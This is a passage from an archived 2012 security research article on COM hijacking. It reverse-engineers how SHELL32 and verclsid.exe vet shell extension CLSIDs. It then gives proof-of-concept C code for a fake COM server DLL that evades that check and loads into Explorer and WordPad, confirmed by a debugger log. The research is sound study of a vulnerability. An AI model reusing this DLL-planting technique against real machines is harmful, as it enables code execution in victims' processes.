<li>Search for the parameter of the type <strong>REG_DWORD</strong> with a name specified in Item 1, in the Registry branch <strong>HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached</strong>.
 Upon finding such a parameter equaling 0, the function returns the 
control with the value of 0, and otherwise with the value of 1.</li>
<li>Search for the parameter of the type <strong>REG_BINARY</strong> with a name specified in Item 1 and the size of 16 bytes, in the Registry branch <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached</strong>.</li>
<li>If the parameter in Item 3 is found, the function evaluates the 
first four bytes. If they equal zero, the function executes the 
operations described in Item 5. Otherwise, it exits with the returned 
value of 1.</li>
<li>The function evaluates the third and forth 4-byte strings against the time it gets from <strong>GetSystemTimeAsFileTime</strong>
 (see the picture below) in order to check whether it's been 10 seconds 
since this parameter was last modified. If not, the function exits with 
the returned value of 0. Otherwise, the function executes the operations
 described in Item 6.</li>
<li>Construction of a string with the pattern '/S /C %s /I %s /X 0x%X', pszCLSID, pszIID, dwClsContext.</li>
<li>Start of the process %WINDIR%\system32\verclsid.exewith the parameter string constructed in Item 6.</li>
<li>If the error ERROR_FILE_NOT_FOUND (2) occurred after the function 
CreateProcessW was called, the function exits with the returned value of
 1. If an error other than ERROR_FILE_NOT_FOUND was thrown, the function
 exits returning that error. If no error was thrown, the function goes 
on to executing the operations described in Item 9.</li>
<li>The function waits until the <strong>WaitForSingleObject</strong> function ends the verclsid.exe process and the <strong>GetExitCodeProcess</strong> function determines its returned value.</li>
<li>10. Collecting data for the Registry parameter <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached</strong>with the name specified in Item 1. The parameters are explained in the picture.
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image9.png" alt=""></div>
1 — caching control: 0 — caching is enabled, 1 — disabled;<br> 2 — optional data;<br> 3 — earlier 4-byte time value returned by GetSystemTimeAsFileTime;<br> 4 — later 4-byte time value returned by GetSystemTimeAsFileTime</li>
<li>If the ending returned value from Item 9 equals 0, then the function
 will exit with the value of 1, and otherwise with the value of 0.</li>
</ol>
<p>We can see that there are quite a few conditions which must be fulfilled in order for the <strong>SHELL32!_QueryClassInterface</strong>
 function to exit with a return value other than 0. One of those 
conditions is the ending of the verclsid.exe process with the return 
value of 0. Let's analyze the flow of this program and find out its 
purpose.</p>
<h2 id="otherlink5">Analysis of the program verclsid.exe and ways to circumvent it</h2>
<p>Ok, so verclsid.exe is started by the function <strong>SHELL32!_QueryClassInterface</strong>.
 This program studies the CLSID passed to it as a parameter and, 
depending on various conditions, returns a value. Let's see which 
parameters are passed to verclsid.exe on opening the RTF file in our 
folder.</p>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image10.png" alt=""></div>
<p>We have here the key '/S', the key '/C', after which there comes a 
GUID, then the key '/I', after which another GUID follows, and the key 
'/X', followed by a hexadecimal number. Disassembling the file 
verclsid.exe reveals the roles of each of these keys:</p>
<ul>
<li>'/S' sets the flagCOINIT_APARTMENTTHREADED for the function <strong>OLE32!CoInitializeEx</strong>;</li>
<li>'/C' sets the GUID for the coclass, i. e., our CLSID;</li>
<li>'/I' sets the interface for the coclass set by the '/C' parameter, in this case IShellFolder;</li>
<li>'/X'sets the parameter dwClsContext for the function <strong>OLE32!CoCreateInstance</strong>, which in this case equals CLSCTX_INPROC_SERVER|CLSCTX_NO_CODE_DOWNLOAD.</li>
</ul>
<p>After the command line has been parsed and the application has received all its entry parameters, COM is initialized via the <strong>OLE32!CoInitializeEx</strong> function and a secondary <strong>WatchDog</strong>
 thread is created which simply sleeps for 15 seconds. If the program 
has not ended within that time, it gets terminated with a return value 
of 2:</p>
<pre><code>_WatchDog@4     proc near           
    push    15000             ; dwMilliseconds
    call    ds:__imp__Sleep@4 ; Sleep(x)
    push    2                 ; uExitCode
    call    ds:__imp__GetCurrentProcess@0 ; GetCurrentProcess()
    push    eax               ; hProcess
    call    ds:__imp__TerminateProcess@8 ; TerminateProcess(x,x)
    retn    4
_WatchDog@4     endp</code></pre>
<p>Then the primary thread calls the function <strong>OLE32!CoCreateInstance</strong>:</p>
<pre><code>CoCreateInstance( “{42071714-76D4-11D1-8B24-00A0C9068FF3}”, NULL, CLSCTX_INPROC_SERVER|CLSCTX_NO_CODE_DOWNLOAD, “{000214E6-0000-0000-C000-000000000046}”, &amp;ppv )</code></pre>
<p>If calling the <strong>OLE32!CoCreateInstance</strong> function was 
unsuccessful, the program exits with the value of 3. Otherwise the 
QueryInterface method is called for the newly created COM object:</p>
<pre><code>ppv-&gt;QueryInterface("{9B45E435-34A9-4E6B-A2A1-B0ECD284967C}", &amp;ppvObject)</code></pre>
<p>In other words, the interface 
'{9B45E435-34A9-4E6B-A2A1-B0ECD284967C}' is requested from our object. 
If the function QueryInterface throws an error, the program exits with 
the value of 3. Otherwise the Release method is called:</p>
<pre><code>ppv-&gt;Release()</code></pre>
<p>Then the program calls the <strong>OLE32!CoUninitialize</strong> 
function in order to deinitialize the COM and exits with the value of 0,
 which is exactly what we need. To write a primitive COM server, we can 
use the 'Description of COM principle'[6], in which the working 
mechanism of the function <strong>OLE32!CoCreateInstance</strong> is 
described in sufficient detail. The source files for the COM server can 
be found in the archive enclosed with this article. They are pretty 
ordinary except for one notable detail. As we always return the S_OK 
value for any requested interface, this may cause some applications to 
crash. Therefore DllMain checks which application has called this 
function:</p>
<div class="aside">
<p><a href="https://web.archive.org/web/20180315065432/http://blog.csdn.net/guogangj/article/details/1801788">6. Description of COM principle</a></p>
</div>
<pre><code>BOOL WINAPI
DllMain( 
    IN HINSTANCE hInstance,
    IN DWORD     dwReason,
    IN LPVOID    lpReserved
)
{
    BOOL retValue = FALSE;

    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        {
            TCHAR processPath [MAX_PATH] = { 0 };
            TCHAR verclsidPath[MAX_PATH] = { 0 };

            GetModuleFileName(NULL, processPath, _countof(processPath));
            GetWindowsDirectory(verclsidPath, MAX_PATH);
            PathAppend(verclsidPath, _T("system32\\verclsid.exe"));

            if ( 0 == StrCmpI(processPath, verclsidPath) ) {
                retValue   = TRUE;
            } else {
                // to do what you need
                // this code will run in context on another process
            }
            DisableThreadLibraryCalls( hInstance );
            break;
        }

    case DLL_THREAD_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return (retValue);
}</code></pre>
<p>Afterwards, let's place the DLL in the folder C:\Documents and 
Settings\Administrator, open our RTF file again and take a look at the 
debugger console:</p>
<pre><code>kd&gt; g 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\system32\verclsid.exe 
&gt;&gt;&gt; COM-DLL-fake: DllGetClassObject 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::CSomeFactory 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::AddRef 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::QueryInterface 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::AddRef 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::CreateInstance 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::CSomeCoClass 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::QueryInterface 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeFactory::~CSomeFactory 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::QueryInterface 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::QueryInterface 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::Release 
&gt;&gt;&gt; COM-DLL-fake: CSomeCoClass::CSomeCoClass 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\WINDOWS\Explorer.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\Program Files\Windows NT\Accessories\WORDPAD.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\Program Files\Windows NT\Accessories\WORDPAD.EXE 
&gt;&gt;&gt; COM-DLL-fake: DllMain: process = C:\Program Files\Windows NT\Accessories\WORDPAD.EXE</code></pre>
<p>Now, as we can see, the attack is proceeding successfully. Let's note
 that, in order to achieve this, the DLL must be located in the Current 
Directory of the explorer.exe process.</p>
<h2 id="otherlink6">Conclusion</h2>
<p>To sum it up, now we can tell that the DLL Hijacking attack is 
applicable to the COM technology as well. However, in order to 
successfully exploit the vulnerability, the perpetrator must overcome 
certain obstacles (circumvent verclsid.exe, check for the presence of 
keys in various branches of the Registry). A possible direction of 
further study is the search for COM servers with disabled caching, which
 are vulnerable to the DLL Hijacking attack.</p>
<h2 id="otherlink7">Literature</h2>
<ol>
<li><a href="https://web.archive.org/web/20180315065432/http://blog.acrossecurity.com/2011/06/com-server-based-binary-planting-proof.html">COM Server-Based Binary Planting Proof Of Concept.</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://blog.acrossecurity.com/2011/05/silently-pwning-protected-mode-ie9-and.html">Silently Pwning Protected-Mode IE9 and Innocent Windows Applications.</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://www.codeproject.com/KB/COM/comintro.aspx?display=Print">Introduction to COM - What It Is and How to Use It.</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://www.codeproject.com/KB/COM/comintro2.aspx?display=Print">Introduction to COM Part II - Behind the Scenes of a COM Server</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://www.codeproject.com/KB/shell/NamespaceExtImpl.aspx?display=Print">An almost complete Namespace Extension Sample.</a></li>
</ol>
<h2 id="otherlink8">Attachment</h2>
<a href="https://web.archive.org/web/20180315065432/http://www.nobunkum.org/files/com-hijacking/code-com-hijacking.7z">code-com-hijacking.7z</a> <br><br>
<p class="author" style="padding-left: 0px;">Last updated: 05.04.2012</p>
</div>
  ﻿</div>
  <div id="footer">
    <p class="copyright">© 2009–2012 <a href="https://web.archive.org/web/20180315065432/http://www.nobunkum.ru/">NOBUNKUM</a> by <a href="https://web.archive.org/web/20180315065432/http://www.esagelab.ru/">Esage Lab</a> &nbsp;&nbsp;&nbsp;&nbsp;<a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/ru/">/на русском языке</a> <a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/about">/about</a> <a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/rss">/rss</a></p>
  </div>
  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-3546318-9']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://web.archive.org/web/20180315065432/https://ssl' : 'https://web.archive.org/web/20180315065432/http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


</body></html>
<!--
     FILE ARCHIVED ON 06:54:32 Mar 15, 2018 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 12:12:54 May 30, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 0.712
  exclusion.robots: 0.217
  exclusion.robots.policy: 0.205
  esindex: 0.01
  cdx.remote: 5.227
  LoadShardBlock: 191.96 (3)
  PetaboxLoader3.datanode: 225.613 (4)
  load_resource: 217.643
  PetaboxLoader3.resolve: 108.994
-->